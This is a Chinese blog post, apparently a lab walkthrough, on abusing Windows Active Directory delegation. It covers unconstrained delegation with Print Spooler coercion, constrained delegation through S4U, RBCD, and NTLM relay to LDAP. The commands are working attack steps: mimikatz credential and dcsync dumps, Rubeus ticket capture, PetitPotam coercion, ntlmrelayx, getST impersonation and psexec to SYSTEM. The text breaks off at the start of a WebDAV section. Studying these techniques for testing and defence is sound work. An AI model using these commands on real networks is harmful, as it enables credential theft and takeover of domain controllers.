@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaGty1" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      Windows域渗透中对委派攻击的思考与实践 
+      
+      
+      |
+    
+     KaGty1 &#39;s Personal Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
+    <link rel="icon" href="/images/kagty1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/kagty1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">kagty1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">文章列表</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">关于我</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">我的挚友</a>
+        </li>
+      
+        <li class="nav-item" data-path="/research/">
+          <a href="/research/">研发</a>
+        </li>
+      
+        <li class="nav-item" data-path="/life/">
+          <a href="/life/">生活的碎碎念</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Windows域渗透中对委派攻击的思考与实践</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2026-05-22 13:16:47
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h3 id="约束委派与非约束委派"><a href="#约束委派与非约束委派" class="headerlink" title="约束委派与非约束委派"></a>约束委派与非约束委派</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p><strong>非约束性委派 (Unconstrained Delegation)</strong>：老板给了某位员工一把万能钥匙，可以打开公司的所有门。当用户&#x2F;服务访问设置了非约束性委派的目标主机时, <code>TGT</code>会被目标主机的<code>LSASS </code>(系统安全服务) 进程缓存到内存中,  就相当于老板给员工钥匙的这个过程。</p>
+<p><strong>约束委派 (Constrained Delegation)</strong>：老板给了某位员工一把钥匙，但是只能打开公司财务部的门</p>
+<h4 id="非约束性委派利用"><a href="#非约束性委派利用" class="headerlink" title="非约束性委派利用"></a>非约束性委派利用</h4><p>有权修改计算机对象属性的人通过设置对象的<code>userAccountControl</code>标志位中的<code>TRUSTED_FOR_DELEGATION</code>位为<code>true</code>，就可以启用非约束性委派</p>
+<p>若通过漏洞&#x2F;配置不当获取形如<code>GenericWrite</code>写权限 (可以修改计算机对象的任何属性) , <code>WriteProperty</code> (被授权对某个特定属性的写权限), 可以尝试利用<code>PowerShell</code>命令设置非约束性委派, 配合打印机漏洞等实现横向移动</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-ADAccountControl</span> <span class="literal">-Identity</span> <span class="string">&quot;test-PC<span class="variable">$</span>&quot;</span> <span class="literal">-TrustedForDelegation</span> <span class="variable">$true</span>  //Powershell设置非约束性委派</span><br><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Identity</span> <span class="string">&quot;test-PC<span class="variable">$</span>&quot;</span> <span class="literal">-Properties</span> TrustedForDelegation | <span class="built_in">Select-Object</span> Name, TrustedForDelegation  //查看是否设置成功</span><br><span class="line"><span class="built_in">Set-ADAccountControl</span> <span class="literal">-Identity</span> <span class="string">&quot;test-PC<span class="variable">$</span>&quot;</span> <span class="literal">-TrustedForDelegation</span> <span class="variable">$false</span>  //Powershell关闭非约束性委派</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250603162214641.png" alt="image-20250603162214641"></p>
+<p><strong>非约束性委派 + 打印机漏洞 Print Spooler</strong></p>
+<p>Print Spooler服务Windows中默认开启</p>
+<p>可以进行利用让域管的机器账号强制与我们拿下的非约束性委派的主机强行建立连接, 利用<code>Rubeus</code>工具监听<code>LSASS</code>进程从而捕获域管机器账户的<code>TGT</code>, 最后将票据注入内存, 实现提权, 结合<code>mimikatz</code>导出域内哈希进行横向移动</p>
+<p>用<code>Rubeus</code>监听来自域控的票据</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe<span class="built_in"> monitor </span>/interval:2 /filteruser:DC$ </span><br></pre></td></tr></table></figure>
+
+<p><code>Print Spooler</code>利用工具 : <code>https://github.com/leechristensen/SpoolSample</code></p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">SpoolSample.exe</span> DC test-<span class="built_in">PC</span></span><br></pre></td></tr></table></figure>
+
+<p><code>Rubeus</code>监听到<code>DC$</code>的<code>TGT</code>票据, 导入票据</p>
+<figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:doIFGjCCBRagAwIBBaEDAgEWooIEIzCCBB9hggQbM<span class="params">...</span><span class="params">...</span></span><br></pre></td></tr></table></figure>
+
+<p>将票据注入内存中, 使用<code>mimikatz</code>导出域内用户哈希, <code>PTH</code>进行域内横向</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;log&quot;</span> <span class="string">&quot;lsadump::dcsync /all /csv&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="约束性委派利用"><a href="#约束性委派利用" class="headerlink" title="约束性委派利用"></a>约束性委派利用</h4><p>约束性委派中，<code>kerberos</code>引入了<code>S4U2Self</code>和<code>S4U2Proxy</code>两种核心拓展机制。</p>
+<p><code>S4U2Self</code>：</p>
+<p>当某个服务（如Web服务器）收到用户请求时，它需要确认用户的身份和权限。此时，服务可以通过<code>S4U2Self</code>向<code>KDC</code>（密钥分发中心）申请一个<strong>针对自身的服务票据</strong>，这个票据是“模拟用户身份”生成的。</p>
+<p><code>S4U2Proxy</code>：</p>
+<p>当服务需要代表用户访问<strong>其他后端服务</strong>（如数据库、文件服务器）时，<code>S4U2Proxy</code>允许服务使用用户的票据向<code>KDC</code>申请目标服务的访问权限。</p>
+<p>配置了约束性委派的账户的<code>userAccountControl</code>属性会被设置为<code>TRUSTED_TO_AUTH_FOR_DELEGATION</code>，账户的<code>msDS-AllowedToDelegateTo</code>属性为允许委派的服务。</p>
+<p><strong>攻击步骤</strong></p>
+<p>(1) 攻击者拿到了配置了约束委派的服务账户&#x2F;域内机器账户，并且已经利用<code>mimikatz</code>等工具导出了账户哈希、票据等信息。</p>
+<p>(2) 通过<code>S4U2Self &amp;&amp; S4U2Proxy</code>来获取获取<code>ST</code></p>
+<p>攻击者用服务账户&#x2F;域内机器账户的权限，向<code>KDC</code>发起<code>S4U2Self</code>请求，模拟某个高权限用户(如域管)生成针对自身的服务票据，将<code>S4U2Self</code>生成的票据转发给目标服务(如域控的<code>CIFS</code>服务)，可获取访问的<code>ST</code></p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通俗解释：</span><br><span class="line">假设你是一家公司的IT部门（对应服务账户WIN10-<span class="number">1</span><span class="variable">$）</span>，老板（对应域管理员Administrator）让你帮忙申请一张门禁卡（Kerberos票据），这张卡可以打开财务部的门（CIFS/DC2016.redteam.lab服务）。</span><br><span class="line">但你作为IT部门，必须去公司总部的门禁中心（KDC/域控制器）申请这张卡。申请时你需要告诉门禁中心：“老板让我申请这张卡，请验证他是否真的有权限开门。”</span><br><span class="line">门禁中心会检查老板的权限，如果确实有权，就会给你一张写有老板名字的门禁卡（模拟用户身份的票据）。</span><br><span class="line">拿到卡后，你可以用它去财务部开门（访问目标服务），仿佛你就是老板本人。</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>DC</code>域控给<code>test-PC</code>主机设置了约束性委派，允许委派<code>DC</code>的<code>CIFS</code>服务</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604124847196.png" alt="image-20250604124847196"></p>
+<p>攻击者拿下了<code>test-PC</code>这台机器，目标是利用约束委派横向拿下<code>DC</code>域控</p>
+<p><strong>(1) 利用<code>test-PC</code>机器用户票据 + <code>kekeo</code>横向</strong></p>
+<p>先使用<code>mimikatz</code>导出票据，拿到机器用户票据</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::tickets /export&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604125652827.png" alt="image-20250604125652827"></p>
+<p><code>kekeo</code>申请<code>ST</code></p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo<span class="selector-class">.exe</span> &quot;tgs::s4u /tgt:[<span class="number">0</span>;<span class="number">3</span>e7]-<span class="number">2</span>-<span class="number">0</span>-<span class="number">60</span>a10000-TEST-PC$<span class="keyword">@krbtgt-HACK-MY</span>.COM.kirbi /<span class="attribute">user</span>:Administrator<span class="keyword">@hack-my</span>.com /<span class="attribute">service</span>:cifs/DC.hack-my.com<span class="string">&quot; &quot;</span>exit<span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604130716639.png" alt="image-20250604130716639"></p>
+<p>利用<code>mimikatz</code>导入<code>ST</code>票据</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::ptt TGS_Administrator<span class="variable">@hack</span>-my.com<span class="variable">@HACK</span>-MY.COM_cifs~DC.hack-my.com<span class="variable">@HACK</span>-MY.COM.kirbi&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>导入后可正常访问<code>DC</code>的<code>cifs</code>服务</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604130910457.png" alt="image-20250604130910457"></p>
+<p>(2) 利用<code>test-PC</code>机器用户<code>Hash</code> + <code>getST</code> + <code>psexec</code>拿下域控<code>system</code>权限</p>
+<p>先导出<code>test-PC</code>机器用户<code>NTLM Hash</code></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz<span class="selector-class">.exe</span> <span class="string">&quot;privilege::debug&quot;</span> <span class="string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="string">&quot;log&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLM Hash : 4631044<span class="type">bac1ad6054011e1750eb0af84</span></span><br></pre></td></tr></table></figure>
+
+<p><code>getST</code>申请<code>ST</code></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> getST.<span class="keyword">py</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span> -spn CIFS/DC.hack-my.<span class="keyword">com</span> -impersonate administrator hack-my.<span class="keyword">com</span>/test-PC$ -hashes :<span class="number">4631044</span>bac1ad6054011e1750eb0af84</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604131538268.png" alt="image-20250604131538268"></p>
+<p>导入票据 + <code>psexec</code>利用，拿下域控<code>system</code>权限</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">set</span> KRB5CCNAME=administrator<span class="variable">@CIFS_DC</span>.hack-my.com<span class="variable">@HACK</span>-MY.COM.ccache</span><br><span class="line">python psexec.py -<span class="literal">no</span>-pass -k DC.hack-my.com -target-ip <span class="number">192.168.43.100</span> -dc-ip <span class="number">192.168.43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250604131756308.png" alt="image-20250604131756308"></p>
+<h3 id="基于资源的约束委派-RBCD"><a href="#基于资源的约束委派-RBCD" class="headerlink" title="基于资源的约束委派[RBCD]"></a>基于资源的约束委派[RBCD]</h3><h4 id="RBCD概述"><a href="#RBCD概述" class="headerlink" title="RBCD概述"></a>RBCD概述</h4><p>基于资源的约束委派 (<code>Resource-Based Constrained Delegation</code>)是<code>Windows Server 2012</code>引入的权限委派机制，其核心思想是<strong>将委派控制权交给资源自身</strong>。通俗解释：仓库管理员自主决定谁可以来提货</p>
+<p><strong>传统委派</strong>：<code>Service </code>A可以代理用户访问<code>Service B</code>，需要域管将<code>Service A</code>的<code>msDS-AllowedToDelegateTo</code>属性指定为<code>Service B</code></p>
+<p><strong>RBCD</strong>：<code>Service B</code>自主决定”<strong>谁可以代理用户访问我</strong>“，比如指定<code>Service A</code>可以代理用户访问我，只需要在<code>Service B</code>上将<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>属性指定为<code>Service A</code>即可。</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601093904614.png" alt="image-20250601093904614"></p>
+<h4 id="攻击利用概述"><a href="#攻击利用概述" class="headerlink" title="攻击利用概述"></a>攻击利用概述</h4><p>攻击者可以利用<code>RBCD</code>来伪造身份票据来访问特定服务。攻击者创建一个机器账户 - <code>HackPC$</code>，并将其<code>SID</code>写入<code>Service B</code>的<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>中，然后伪造成为域管来访问<code>Service B</code></p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p><strong>拥有修改<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>的权限</strong></p>
+<p>(1) 将机器加入域的用户</p>
+<p>(2) 拥有<code>Account Operators</code>组权限的账户 (可管理除域控外的机器)</p>
+<p>(3) 对目标主机具备<code>GenericAll</code>、<code>WriteProperty</code>等写权限的账户</p>
+<p>(4) 该主机的机器账户</p>
+<h4 id="域用户本地提权"><a href="#域用户本地提权" class="headerlink" title="域用户本地提权"></a>域用户本地提权</h4><p>我们拿到了一个域内用户，但是发现该用户是普通用户，没有这台域内主机的<code>administrator</code>权限，可以利用<code>RBCD</code>进行本地提权。</p>
+<p><strong>思路：</strong></p>
+<p>1、利用可控域用户创建一个机器账户 (每个域用户默认可以创建10个机器账户)</p>
+<p>2、修改目标主机的 <code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>属性，使其指向新创建机器账户的<code>SID</code></p>
+<p>3、利用该机器账户的凭证为”跳板”，请求以administrator身份访问目标主机的票据，配合<code>psexec</code>实现本地提权。</p>
+<p>首先使用<code>Adfind.exe</code>查询域内机器的<code>mS-DS-CreatorSID</code>，与当前用户的<code>SID</code>进行比较</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">AdFind.exe</span> -<span class="keyword">b</span> <span class="string">&quot;DC=hack-my,DC=com&quot;</span> -f <span class="string">&quot;objectClass=computer&quot;</span> <span class="meta">cn</span> ms-DS-CreatorSID</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250531133606395.png" alt="image-20250531133606395"></p>
+<p>可知<code>TEST-PC</code>这台机器是通过我们拿到的这个域用户<code>hack-my\test</code>加入域中的，那么当前域用户可以修改这台主机的<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>属性。</p>
+<p>使用当前域用户新建一个机器账户</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> addcomputer.<span class="keyword">py</span> hack-my.<span class="keyword">com</span>/test:<span class="string">&quot;密码&quot;</span> -computer-name TEST$ -computer-pass <span class="number">123456</span> -dc-host DC.hack-my.<span class="keyword">com</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250531134748299.png" alt="image-20250531134748299"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250531134844193.png" alt="image-20250531134844193"></p>
+<p>然后配置<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>属性，让<code>TEST$</code>机器账户获得了假扮任意用户访问<code>TEST-PC$</code>的能力，<code>[*] TEST$ can already impersonate users on TEST-PC$ via S4U2Proxy</code></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> rbcd.<span class="keyword">py</span> hack-my.<span class="keyword">com</span>/test:<span class="string">&quot;密码&quot;</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span>  -action <span class="keyword">write</span> -delegate-<span class="keyword">to</span> TEST-PC$ -delegate-from TEST$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250531141212286.png" alt="image-20250531141212286"></p>
+<p>利用<code>S4U</code>协议伪造<code>Administrator</code>的<code>ST</code></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> getST.<span class="keyword">py</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span> -spn cifs/TEST-PC.hack-my.<span class="keyword">com</span> -impersonate Administrator hack-my.<span class="keyword">com</span>/test$:<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250531141411428.png" alt="image-20250531141411428"></p>
+<p>利用拿到的<code>ST</code>配合<code>psexec</code>提权至<code>system</code></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=Administrator@cifs_TEST-PC<span class="selector-class">.hack-my</span>.com@HACK-MY<span class="selector-class">.COM</span><span class="selector-class">.ccache</span>   <span class="comment">//linux/MacOS写法</span></span><br><span class="line">set KRB5CCNAME=Administrator@cifs_TEST-PC<span class="selector-class">.hack-my</span>.com@HACK-MY<span class="selector-class">.COM</span><span class="selector-class">.ccache</span>  <span class="comment">//Windows写法</span></span><br><span class="line">python psexec<span class="selector-class">.py</span> -no-pass -k TEST-PC<span class="selector-class">.hack-my</span><span class="selector-class">.com</span> -target-ip <span class="number">192.168</span>.<span class="number">43.42</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601092908416.png" alt="image-20250601092908416"></p>
+<h4 id="域内服务账户提权"><a href="#域内服务账户提权" class="headerlink" title="域内服务账户提权"></a>域内服务账户提权</h4><p><code>IIS</code>、<code>MSSQL</code>、<code>Network Service</code>等服务账户出网时使用的是本地的机器账户，访问域内资源时能够以机器账户的身份修改自身的委派属性，从而实现本地提权。</p>
+<p>以设置了服务账户<code>IIS</code>的<code>WIN2008-WEB</code>为例，提权原理和上文的”域用户本地提权”差别不大</p>
+<p><code>SharpAllowedToAct</code>工具需要<code>.NET</code>环境，自行下载</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SharpAllowedToAct<span class="selector-class">.exe</span> -m test2 -<span class="selector-tag">p</span> <span class="string">&quot;123456&quot;</span> -t WIN2008-WEB -<span class="selector-tag">a</span> dc<span class="selector-class">.hack-my</span><span class="selector-class">.com</span> -d hack-my.com</span><br></pre></td></tr></table></figure>
+
+<p>然后和上面一样的思路</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> getST.<span class="keyword">py</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span> -spn cifs/WIN2008-WEB.hack-my.<span class="keyword">com</span> -impersonate Administrator hack-my.<span class="keyword">com</span>/test2$:<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> <span class="attribute">KRB5CCNAME</span>=Administrator@cifs_TEST-PC.hack-my.com@HACK-MY.COM.ccache</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> psexec.py -<span class="literal">no</span>-pass -k WIN2008-WEB.hack-my.com -target-ip <span class="number">192.168.43.216</span> -dc-ip <span class="number">192.168.43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601123903774.png" alt="image-20250601123903774"></p>
+<h4 id="NTLM-Relay-to-ldap-RBCD"><a href="#NTLM-Relay-to-ldap-RBCD" class="headerlink" title="NTLM Relay to ldap + RBCD"></a>NTLM Relay to ldap + RBCD</h4><p><strong>(1) SMB</strong></p>
+<p>默认情况下,<code> LDAP</code> 的签名策略为协商签名 (是否签名由客户端决定), 当使用 <code>SMB</code> 协议发起<code> LDAP</code> 请求时, 就会要求<code>LDAP</code>服务器对<code>NTLM</code>认证请求强制签名, 所以一般来说无法通过<code>SMB</code>协议进行<code> NTLM Relay to LDAP</code></p>
+<p>但是 2019 年爆出了<code> CVE-2019-1040</code> 漏洞, 它能够绕过<code> NTLM MIC</code> 的防护机制, 修改<code>NTLM</code>请求中的某些标志位, 使得客户端对于 <code>SMB</code> 发起的<code>LDAP</code>请求不要求签名, 从而实现<code> NTLM Relay</code></p>
+<p>结合强制认证 (例如 <code>SpoolSample</code>, <code>PetitPotam</code>) 配合<code>RBCD</code><strong>可以实现横向移动</strong></p>
+<p><strong>攻击流程</strong></p>
+<p>先通过<code>PetitPotam</code>，打印机漏洞触发<code>DC</code>&#x2F;目标主机的<code>NTLM</code>认证请求，将认证流量中继到目标<code>LDAP</code>服务器(通常就是域控)</p>
+<p>攻击者利用中继的凭据，在<code>DC</code>&#x2F;目标主机上配置<code>RBCD</code>策略，将攻击者添加的机器账户添加到目标主机的<code>msDS-AllowedToActOnBehalfOfOtherIndentity</code>属性中，然后伪造用户访问提权即可拿下目标主机</p>
+<p><strong>复现环境</strong></p>
+<p><strong>TEST-PC</strong>：<code>Windows7</code>，已经拿下的域内主机，<code>192.168.43.42</code></p>
+<p><strong>DC</strong>：<code>Windows Server 2012</code>，域控，<code>192.168.43.100</code></p>
+<p><strong>WIN2008-WEB</strong>：<code>Windows Server 2008</code>，IIS服务器，<code>192.168.43.216</code></p>
+<p><strong>Kali_linux</strong>：攻击机，<code>192.168.43.78</code></p>
+<p><strong>目标</strong>：拿下<code>TEST-PC</code>后，利用<code>NTLM Relay to ldap + RBCD</code>横向拿下<code>WIN2008-WEB</code>这台主机</p>
+<p>首先添加机器账户<code>test</code></p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> addcomputer.<span class="keyword">py</span> hack-my.<span class="keyword">com</span>/test:<span class="string">&quot;密码&quot;</span> -computer-name TEST$ -computer-pass <span class="number">123456</span> -dc-host DC.hack-my.<span class="keyword">com</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span></span><br></pre></td></tr></table></figure>
+
+<p>启动<code>ntlmrelayx</code>等待目标主机连接</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 ntlmrelayx.py -t ldap:<span class="string">//192.168.43.100</span> <span class="params">--remove-mic</span> <span class="params">--delegate-access</span> <span class="params">--escalate-user</span> TEST$</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601150653864.png" alt="image-20250601150653864"></p>
+<p>利用<code>PetitPotam</code>让目标机器发起对攻击机的SMB请求</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">python</span> PetitPotam.py -d hack-my.com -u test -p <span class="string">&quot;密码&quot;</span> <span class="number">192.168.43.78</span> <span class="number">192.168.43.216</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601154759136.png" alt="image-20250601154759136"></p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601154823042.png" alt="image-20250601154823042"></p>
+<p>伪造管理员访问目标主机，配合<code>psexec</code>拿下<code>WIN2008-WEB</code>的<code>system</code>权限</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> getST.<span class="keyword">py</span> -dc-ip <span class="number">192.168</span>.<span class="number">43.100</span> -spn cifs/WIN2008-WEB.hack-my.<span class="keyword">com</span> -impersonate Administrator hack-my.<span class="keyword">com</span>/test$:<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">export</span> KRB5CCNAME=Administrator<span class="variable">@cifs_WIN2008</span>-WEB.hack-my.com<span class="variable">@HACK</span>-MY.COM.ccache</span><br><span class="line">python psexec.py -k -<span class="literal">no</span>-pass WIN2008-WEB.hack-my.com -target-ip <span class="number">192.168.43.216</span> -dc-ip <span class="number">192.168.43.100</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250601160400252.png" alt="image-20250601160400252"></p>
+<p><strong>(2) WebDAV</strong></p>
+<p>首先先了解<code>WebDAV</code>的概念，<code>WebDAV</code>是一种基于<code>HTTP</code>的通信协议</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250602092703350.png" alt="image-20250602092703350"></p>
+<p>对于<code>HTTP(WebDAV)</code>协议发起的 <code>LDAP</code> 请求是不要求强制签名的，因此可以绕过签名实现<code>NTLM Relay</code></p>
+<p><code>Windows</code>使用<code>WebClient</code>服务实现<code>WebDAV</code>，<code>WebDAV</code>通过<code>\\evilhost@80\webdav\kagty1.txt</code>这种 UNC 格式访问攻击者的 HTTP 服务器。</p>
+<p><strong>注意：</strong></p>
